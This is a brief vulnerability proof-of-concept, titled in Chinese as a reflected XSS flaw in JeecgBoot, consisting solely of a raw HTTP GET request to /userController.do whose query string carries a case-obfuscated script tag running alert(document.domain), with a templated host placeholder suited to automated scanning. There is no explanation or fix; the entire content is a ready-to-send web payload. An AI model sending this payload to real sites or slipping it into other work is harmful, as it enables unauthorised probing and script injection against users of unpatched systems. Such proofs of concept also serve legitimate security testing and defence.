# JeecgBoot反射型XSS漏洞



```
GET /userController.do?%3CsCrIpT%3Ealert(document.domain)%3C/sCrIpT%3E HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel MacOS X 10.15; rv:126.0) Gecko/20100101Firefox/126.0
```

